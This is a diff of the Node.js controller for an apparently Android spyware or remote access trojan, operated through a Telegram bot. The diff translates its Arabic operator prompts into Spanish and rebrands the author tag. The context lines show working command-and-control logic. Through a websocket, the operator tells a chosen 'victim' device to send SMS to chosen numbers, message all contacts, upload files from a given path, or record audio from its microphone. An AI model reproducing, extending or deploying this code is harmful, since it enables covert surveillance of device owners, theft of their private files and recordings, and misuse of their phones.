@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">ONLINE : 𓆪𓆪𓅓 ANDRIUX 𓅓𓆪𓆪 𖤛VIP المطور : @KING7ADX</h1>')
+    res.send('<h1 align="center">ONLINE : 🦁 ANDRIUX 🦁 𖤛VIP المطور : @KING7ADX</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
@@ -90,15 +90,15 @@ appSocket.on('connection', (ws, req) => {
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (message.reply_to_message) {
-        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
+        if (message.reply_to_message.text.includes('°• Escribe el numero al que quieres enviar')) {
             currentNumber = message.text
             appBot.sendMessage(id,
-                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
-                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
+                '°• Escribe el mensaje que quieres enviar desde el dispositivo de la victima\n\n' +
+                '• El mensaje no se enviara si el numero de caracteres es mayor a lo permitido',
                 {reply_markup: {force_reply: true}}
             )
         }
-        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
+        if (message.reply_to_message.text.includes('°• Ahora escribe el mensaje que quieres enviar desde el dispositivo...')) {
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
                     ws.send(`send_message:${currentNumber}/${message.text}`)
@@ -107,18 +107,18 @@ appBot.on('message', (message) => {
             currentNumber = ''
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '°• Espere...\n\n' +
+                '• 🦁 ANDRIUX 🦁 𖤛 VIP  @KING7ADX',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["Ejecutar Comando"], ["Dispositivo Conectado"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
+        if (message.reply_to_message.text.includes('°• Escribe el mensaje que quieres enviar a todos')) {
             const message_to_all = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -127,18 +127,18 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '°• Espere...\n\n' +
+                '• 🦁 ANDRIUX 🦁 𖤛VIP المطور : @KING7ADX',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["Ejecutar Comando"], ["Dispositivo Conectado"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
+        if (message.reply_to_message.text.includes('°• Ingrese la ruta del archivo que desea extraer')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -147,18 +147,18 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '°• Espere...\n\n' +
+                '• 🦁 ANDRIUX 🦁 𖤛VIP المطور : @KING7ADX',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["Ejecutar Comando"], ["Dispositivo Conectado"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
+        if (message.reply_to_message.text.includes('°• Ruta del archivo ')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -167,18 +167,18 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '°• Espere...\n\n' +
+                '• 🦁 ANDRIUX 🦁 𖤛VIP المطور : @KING7ADX',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["Ejecutar Comando"], ["Dispositivo Conectado"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
+        if (message.reply_to_message.text.includes('°• اIngrese duracion de grabacion de voz')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -187,12 +187,12 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK ،',
+                '°• Espere...\n\n' +
+                '• 🦁 ANDRIUX 🦁 𖤛VIP المطور : @KING7ADX',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
+                        "keyboard": [["اEjecutar Comando"], ["Dispositivo Conectado"]],
                         'resize_keyboard': true
                     }
                 }
